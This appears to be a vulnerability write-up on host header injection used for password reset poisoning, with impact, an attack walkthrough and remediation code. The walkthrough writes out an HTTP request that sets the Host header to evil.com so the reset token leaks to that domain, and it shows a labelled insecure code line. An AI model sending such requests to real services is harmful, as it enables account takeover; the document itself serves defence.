# Host Header Injection → Password Reset Poisoning

## Vulnerability Analysis

### Description

The password reset functionality uses the `Host` header from the HTTP request to construct the reset link sent to the user's email. An attacker can manipulate this header to point the reset link to a malicious domain.

### Impact

- **Account takeover**: When the victim clicks the poisoned reset link, the token is leaked to the attacker's server
- **Credential theft**: Full compromise of the victim's account
- **Phishing amplification**: The email appears legitimate since it comes from the real service

### Attack Scenario

1. Attacker initiates a password reset for the victim's email
2. Attacker intercepts/modifies the request to change the `Host` header:
```
POST /reset-password HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```
3. The server generates a reset link using the manipulated host:
```
https://evil.com/reset?token=abc123
```
4. The email is sent to the victim with the poisoned link
5. When the victim clicks the link, the token is sent to evil.com
6. Attacker uses the token to reset the password on the real site

### Remediation

1. **Use absolute URLs**: Hardcode the base URL in the reset link instead of using the Host header
2. **Validate Host header**: Check against a whitelist of allowed hosts
3. **Use configured base URL**: Read from server configuration, not from request headers

```python
# Bad
reset_link = request.host_url + "reset?token=" + token

# Good
reset_link = config.BASE_URL + "reset?token=" + token
```

### References

- OWASP: Host Header Injection
- CWE-644: Improper Handling of Ambiguity in HTTP Headers
